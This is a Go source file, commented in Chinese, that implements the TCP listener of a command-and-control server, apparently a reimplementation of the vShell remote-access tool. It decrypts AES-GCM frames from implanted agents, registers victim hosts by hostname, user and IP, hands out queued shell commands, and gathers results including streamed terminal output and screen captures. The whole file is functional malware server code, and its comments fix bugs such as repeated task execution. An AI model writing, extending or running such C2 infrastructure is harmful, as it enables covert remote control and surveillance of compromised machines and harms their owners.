// Package c2engine — 原生 TCP 监听器。
//
// 传输口径与 agent 的 `transport_real.go`（`-server tcp://…`）一致：
//
//	[u32 LE 长度][12B nonce][AES-256-GCM 密文][16B tag]   ← 与其它传输共用 FrameEncrypt/Decrypt
//	明文是 JSON：checkin / {"type":"task_poll"} / result
//
// 应答同样是同格式的加密帧。原版在这条传输上用 24 字节记录回传结果，具体线缆
// 形态未恢复（见 agent/transport_real.go 的 KNOWN DIVERGENCE），因此这里沿用
// 复刻端统一的 JSON 信封——与 agent 侧实现配对，链路自洽。
package c2engine

import (
	"bufio"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"sync"
	"time"

	"github.com/google/uuid"
)

// TCPListener 监听裸 TCP 端口，按帧协议处理 agent 消息。
type TCPListener struct {
	ID     int64
	Addr   string
	Vkey   string
	Salt   string
	ln     net.Listener
	mu     sync.Mutex
	conns  map[net.Conn]bool
	closed bool
}

// NewTCPListener 创建 TCP 监听器。
func NewTCPListener(id int64, addr, vkey, salt string) *TCPListener {
	return &TCPListener{ID: id, Addr: addr, Vkey: vkey, Salt: salt, conns: map[net.Conn]bool{}}
}

// Start 开始监听。
func (l *TCPListener) Start() error {
	ln, err := net.Listen("tcp", l.Addr)
	if err != nil {
		return fmt.Errorf("tcp listener %d: %w", l.ID, err)
	}
	l.ln = ln
	go l.acceptLoop()
	log.Printf("[TCP:%d] listening on %s (vkey=%s)", l.ID, ln.Addr(), l.Vkey)
	return nil
}

// Stop 关闭监听与全部连接。
func (l *TCPListener) Stop() {
	l.mu.Lock()
	l.closed = true
	conns := make([]net.Conn, 0, len(l.conns))
	for c := range l.conns {
		conns = append(conns, c)
	}
	l.mu.Unlock()
	if l.ln != nil {
		_ = l.ln.Close()
	}
	for _, c := range conns {
		_ = c.Close()
	}
}

func (l *TCPListener) acceptLoop() {
	for {
		conn, err := l.ln.Accept()
		if err != nil {
			l.mu.Lock()
			closed := l.closed
			l.mu.Unlock()
			if !closed {
				log.Printf("[TCP:%d] accept error: %v", l.ID, err)
			}
			return
		}
		l.mu.Lock()
		l.conns[conn] = true
		l.mu.Unlock()
		go l.handleConn(conn)
	}
}

func (l *TCPListener) handleConn(conn net.Conn) {
	defer func() {
		l.mu.Lock()
		delete(l.conns, conn)
		l.mu.Unlock()
		_ = conn.Close()
	}()

	rd := bufio.NewReader(conn)
	var clientID int64
	remote := conn.RemoteAddr().String()

	for {
		_ = conn.SetReadDeadline(time.Now().Add(120 * time.Second))
		plain, err := readTCPFrame(rd, l.Salt)
		if err != nil {
			if err != io.EOF {
				log.Printf("[TCP:%d] %s read end: %v", l.ID, remote, err)
			}
			return
		}

		var probe struct {
			Type      string `json:"type"`
			VerifyKey string `json:"verify_key"`
			HostName  string `json:"hostname"`
			ClientID  int64  `json:"client_id"`
			CommandID int64  `json:"command_id"`
			Result    string `json:"result"`
			Status    string `json:"status"`
		}
		if err := json.Unmarshal(plain, &probe); err != nil {
			log.Printf("[TCP:%d] %s bad json: %v", l.ID, remote, err)
			return
		}

		// 1) checkin：没有 type 字段、但带 verify_key + hostname
		if probe.Type == "" && probe.HostName != "" {
			if l.Vkey != "" && probe.VerifyKey != l.Vkey {
				log.Printf("[TCP:%d] verify key mismatch from %s", l.ID, remote)
				_ = writeTCPFrame(conn, l.Salt, map[string]interface{}{
					"status": "error", "message": "verify key mismatch",
				})
				return
			}
			var req CheckinRequest
			_ = json.Unmarshal(plain, &req)
			cl, err := registerTCPClient(&req, remote, l.ID)
			if err != nil {
				_ = writeTCPFrame(conn, l.Salt, map[string]interface{}{"status": "error", "message": err.Error()})
				return
			}
			clientID = cl.ID
			_ = writeTCPFrame(conn, l.Salt, map[string]interface{}{
				"status":     "ok",
				"client_id":  cl.ID,
				"session_id": uuid.NewString(),
				"interval":   1,
				"timeout":    60,
			})
			log.Printf("[TCP:%d] agent %d checked in (%s@%s)", l.ID, cl.ID, cl.UserName, cl.HostName)
			continue
		}

		// 2) 任务轮询
		if probe.Type == "task_poll" || probe.Type == "poll" {
			log.Printf("[TCP:%d] %s poll (client=%d)", l.ID, remote, probe.ClientID)
			if probe.ClientID > 0 {
				clientID = probe.ClientID
			}
			tasks := pendingTasksFor(clientID)
			_ = writeTCPFrame(conn, l.Salt, map[string]interface{}{"tasks": tasks, "interval": 1})
			continue
		}

		// 3) 结果回传
		if probe.CommandID > 0 && probe.Status != "" {
			log.Printf("[TCP:%d] %s result cmd=%d status=%s", l.ID, remote, probe.CommandID, probe.Status)
			_ = GetEngine().UpdateTask(probe.CommandID, probe.Result, probe.Status)
			// 流式结果（terminal_output:/screen_frame:）交给既有转发逻辑
			forwardStreamingResult(clientID, probe.Result)
			_ = writeTCPFrame(conn, l.Salt, map[string]interface{}{"status": "ok"})
			continue
		}

		_ = writeTCPFrame(conn, l.Salt, map[string]interface{}{"status": "ok"})
	}
}

// readTCPFrame 读一帧并解密。
func readTCPFrame(rd *bufio.Reader, salt string) ([]byte, error) {
	var hdr [4]byte
	if _, err := io.ReadFull(rd, hdr[:]); err != nil {
		return nil, err
	}
	n := binary.LittleEndian.Uint32(hdr[:])
	if n == 0 || n > 8<<20 {
		return nil, fmt.Errorf("bad frame length %d", n)
	}
	body := make([]byte, n)
	if _, err := io.ReadFull(rd, body); err != nil {
		return nil, err
	}
	return Unframe(body, salt)
}

// writeTCPFrame 加密并写一帧。
func writeTCPFrame(conn net.Conn, salt string, v interface{}) error {
	plain, err := json.Marshal(v)
	if err != nil {
		return err
	}
	// 注意：FrameEncrypt 的输出**已包含** 4 字节小端长度头，直接写即可。
	// 这里再加一层头会让对端解析错位（实测报 cipher: message authentication failed）。
	wire, err := FrameEncrypt(plain, salt)
	if err != nil {
		return err
	}
	_, err = conn.Write(wire)
	return err
}

// registerTCPClient 用 checkin 信息注册/更新客户端，返回客户端对象。
func registerTCPClient(req *CheckinRequest, remote string, listenerID int64) (*Client, error) {
	eng := GetEngine()
	if id, ok := eng.GetClientIdByVkey(req.VerifyKey); ok {
		if c := eng.GetClient(id); c != nil {
			c.SetOnline(true)
			c.Addr = remote
			c.HostName = req.HostName
			c.UserName = req.UserName
			c.OsName = req.OsName
			c.Arch = req.Arch
			c.LocalIP = req.LocalIP
			return c, nil
		}
	}
	return eng.NewClient(req.VerifyKey, "tcp", remote, req.LocalIP, req.UserName, req.HostName,
		req.OsName, req.ProcessName, req.Arch)
}

// pendingTasksFor 取该客户端待执行任务（转换为 agent 侧 TaskItem 结构）。
func pendingTasksFor(clientID int64) []map[string]interface{} {
	eng := GetEngine()
	// 必须用"取出并标记已下发"：否则同一批任务会在每次 poll 时重复下发，
	// agent 就会无限重复执行同一条命令（实测日志里 Task 200/201/202… 循环），
	// 面板侧等待结果也会超时（表现为 "connection error"）。
	tasks := eng.GetAndMarkPendingTasks(clientID)
	if os.Getenv("VSHELL_TCP_DEBUG") != "" {
		log.Printf("[TCP] poll client=%d -> %d task(s)", clientID, len(tasks))
	}
	out := make([]map[string]interface{}, 0, len(tasks))
	for _, t := range tasks {
		out = append(out, map[string]interface{}{
			"id": t.ID, "command": t.Command, "timeout": t.Timeout,
		})
	}
	return out
}
